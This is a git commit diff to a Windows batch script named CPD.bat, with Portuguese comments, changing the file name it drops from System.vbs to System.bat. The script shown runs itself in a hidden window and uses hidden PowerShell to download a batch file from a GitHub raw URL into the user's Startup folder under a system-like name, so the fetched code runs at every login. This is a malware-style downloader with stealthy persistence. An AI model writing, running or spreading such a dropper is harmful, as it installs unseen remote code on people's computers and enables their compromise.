1ca9ee470c4bb8f65f01ea99e8a8a11140b3a72f
lcmandrikion-hash <lcmandrikion@gmail.com>
2026-03-12 06:43:02 -0300

    Update CPD.bat

--- CPD.bat
+++ CPD.bat
@@ -11,7 +11,7 @@ if "%1" neq "hidden" (
 set "URL=https://github.com/lcmandrikion-hash/LZX/raw/refs/heads/main/LXZ.bat"
 
 :: Caminho da pasta Startup
-set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\System.vbs"
+set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\System.bat"
 
 :: Baixa o arquivo
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%STARTUP%'"
